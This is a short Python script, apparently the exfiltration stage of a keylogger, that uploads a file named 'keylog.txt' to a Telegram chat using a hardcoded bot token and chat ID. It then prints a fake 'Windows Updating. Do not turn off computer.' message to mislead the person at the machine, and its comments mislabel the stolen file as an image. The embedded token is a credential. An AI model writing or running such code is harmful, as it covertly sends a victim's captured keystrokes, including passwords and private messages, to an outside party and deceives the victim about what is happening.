import sys
# Add the directory where 'requests' is located
sys.path.insert(0, r'C:\\Python\\Lib\\site-packages')


import telegram
import asyncio

# Define your bot token and chat ID
BOT_TOKEN = '7866483331:AAFLe0iNc5VrdZkrByBrDGfr4asHeZi2O9Q'
CHAT_ID = '2044432474'

# Specify the path to your image file
IMAGE_PATH = 'keylog.txt'  # Replace this with the actual path of your image file

# Define an asynchronous function to send the image to Telegram
async def send_file_to_telegram():
    bot = telegram.Bot(token=BOT_TOKEN)
    with open(IMAGE_PATH, 'rb') as file:
        await bot.send_document(chat_id=CHAT_ID, document=file)
    print("Windows Updating. Do not turn off computer.")

# Run the asynchronous function
def main():
    asyncio.run(send_file_to_telegram())

if __name__ == '__main__':
    main()
